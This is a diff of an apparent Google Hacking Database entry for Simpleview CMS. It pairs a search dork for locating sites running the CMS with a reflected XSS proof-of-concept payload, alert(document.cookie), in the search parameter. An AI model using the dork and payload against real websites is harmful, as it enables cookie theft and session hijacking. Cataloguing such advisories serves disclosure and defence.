@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/3649
+Severity: 5 
 Category:         Advisories and Vulnerabilities
 Published Date:   2010-12-15
 Author:           anonymous
@@ -6,4 +7,4 @@ GoogleDork:       "powered by simpleview CMS"
 Description:      "powered by simpleview CMS"
 
 
-Author: Sun Army XSS: /search/?searchString="&gt;alert(document.cookie)&amp;submitSearch.x=17&amp;submitSearch.y=13
+Author: Sun Army XSS: /search/?searchString="&gt;alert(document.cookie)&submitSearch.x=17&submitSearch.y=13
